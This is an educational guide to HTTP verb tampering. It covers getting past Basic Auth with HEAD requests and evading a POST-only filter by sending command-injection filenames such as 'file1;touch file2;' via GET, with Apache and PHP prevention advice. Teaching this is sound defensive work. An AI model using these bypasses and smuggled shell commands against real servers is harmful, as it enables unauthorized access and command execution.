# HTTP Verb Tampering

HTTP Verb Tampering exploits web servers that accept multiple HTTP methods/verbs. Attackers send requests using unexpected methods to bypass security controls or gain unauthorized access.

## How It Works

HTTP servers accept various methods for different operations:

| Verb    | Description                                                        |
|---------|--------------------------------------------------------------------|
| GET     | Retrieve data                                                      |
| POST    | Submit data                                                        |
| HEAD    | Like GET, but only returns headers                                 |
| PUT     | Write/upload data to a resource                                    |
| DELETE  | Delete a resource                                                  |
| OPTIONS | Show supported HTTP methods                                        |
| PATCH   | Apply partial modifications to a resource                          |

## Types of Vulnerabilities

### 1. Insecure Configuration
- Server configs protect only specific methods
- Other methods remain accessible
- Common in Apache, Tomcat, ASP.NET servers

### 2. Insecure Coding
- Security checks applied inconsistently across methods
- Filter bypasses through method switching
- Common in input validation and security filters

## Real-World Examples

### Example 1: Bypassing Basic Authentication
**Scenario:**
- File Manager web app with restricted `/admin` directory
- Reset functionality at `/admin/reset.php` requires authentication
- Server misconfigured to only protect certain HTTP methods

**Step 1: Identify**
- Accessing `/admin/reset.php` triggers Basic Auth prompt
- Initial request uses GET method:
```http
GET /admin/reset.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
```

**Step 2: Test Different Methods**
1. Check allowed methods:
```bash
curl -i -X OPTIONS http://example.com/admin/reset.php
```
Response shows:
```http
HTTP/1.1 200 OK
Allow: POST,OPTIONS,HEAD,GET
```

2. Try HEAD method (bypasses auth):
```http
HEAD /admin/reset.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
```

### Example 2: Bypassing Command Injection Protection
**Scenario:**
- Security filter blocks special characters in filenames
- Filter only checks POST parameters, not GET

**Step 1: Normal POST (Blocked)**
```http
POST /create.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

filename=test;ls;file2
```

**Step 2: Method Manipulation**
```http
GET /create.php?filename=file1;touch%20file2; HTTP/1.1
Host: example.com
```

## Prevention

### 1. Secure Configuration
- Never limit authorization to specific HTTP methods
- Example secure Apache configuration:
```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <LimitExcept GET POST>
        Deny from all
    </LimitExcept>
    Require valid-user
</Directory>
```

### 2. Secure Coding
- Use consistent method handling:
```php
// VULNERABLE - Inconsistent method usage
if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {  // Only checks POST
    system("touch " . $_REQUEST['filename']);                  // Uses any method
}

// SECURE - Consistent method usage
if (!preg_match('/[^A-Za-z0-9. _-]/', $_REQUEST['filename'])) {  // Checks all methods
    system("touch " . $_REQUEST['filename']);
}
```

### Best Practices
1. **Configuration Level:**
   - Disable unnecessary HTTP methods
   - Use `LimitExcept` instead of `Limit`
   - Apply authentication to all methods

2. **Code Level:**
   - Use inclusive parameter checking:
     - PHP: `$_REQUEST['param']`
     - Java: `request.getParameter('param')`
     - C#: `Request['param']`
   - Keep method handling consistent
   - Apply security filters to all request methods

3. **General:**
   - Disable HEAD requests unless needed
   - Monitor for unexpected HTTP methods
   - Regular security audits 